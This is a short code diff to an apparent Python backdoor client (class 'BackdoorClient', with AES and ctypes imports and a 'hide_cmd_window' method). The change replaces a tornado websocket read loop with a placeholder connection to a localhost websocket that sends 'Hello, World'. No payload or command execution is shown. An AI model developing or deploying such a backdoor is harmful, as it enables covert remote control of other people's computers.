@@ -4,7 +4,7 @@ import os
 import ctypes
 import chardet
 import json
-from tornado import websocket
+from websocket import create_connection
 from Crypto.Cipher import AES
 __author__ = 'nekocode'
 
@@ -26,12 +26,11 @@ class BackdoorClient:
         return plain
 
     def link_server(self):
-        conn = yield websocket.websocket_connection(self.SERVER_HOST)
-        while True:
-            msg = yield conn.read_message()
-            if msg is None:
-                break
-            print msg
+        # todo http://stackoverflow.com/questions/3142705/is-there-a-websocket-client-implemented-for-python
+        ws = create_connection("ws://localhost:8080/websocket")
+        ws.send("Hello, World")
+        result =  ws.recv()
+        ws.close()
 
     @staticmethod
     def hide_cmd_window():
